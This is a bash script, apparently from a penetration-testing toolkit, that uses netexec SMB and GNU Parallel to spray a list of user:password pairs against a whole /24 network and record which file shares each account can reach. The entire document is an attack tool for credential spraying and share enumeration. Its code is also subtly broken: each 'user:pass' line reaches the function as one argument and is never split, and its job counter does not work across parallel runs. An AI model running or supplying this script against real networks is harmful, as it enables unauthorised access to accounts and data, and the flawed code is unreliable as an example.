#!/bin/bash

# Spray using a file creds.txt with user:pass format
# It will list shares on the network and prepend each output with the name of the user (NXC doesnt do this by default)
# It will run 5 threads in parrallels to accellerate the process
# Results are in the output.log

# Check if GNU Parallel is installed
if ! command -v parallel &> /dev/null; then
    echo "GNU Parallel is not installed. You can install it using the following command:"
    echo "sudo apt install parallel"
    exit 1
fi

# Path to the file containing user:password pairs
creds_file="creds.txt"

# Count total number of users
total_users=$(wc -l < "$creds_file")

# Initialize counter
counter=0

# Function to process each user
process_user() {
    local username="$1"
    local password="$2"
    local user_counter="$3"
    local user_total="$4"
    
    # Execute netexec smb command with the current username and password
    # Capture the output and prepend each line with the username
    while IFS= read -r output_line; do
        echo "$username: $output_line" >> output.log
    done < <(netexec smb 192.168.0.0/24 -u "$username" -p "$password" --shares)

}

# Export function so it can be used by GNU Parallel
export -f process_user

# Define the command to be executed by GNU Parallel
parallel_command="process_user {} \$((++counter)) $total_users > /dev/null"

# Loop through each line in the creds file and process users in parallel
cat "$creds_file" | parallel -j 5 -k --eta "$parallel_command"

# Display location of the output file
echo "Results are saved in output.log"
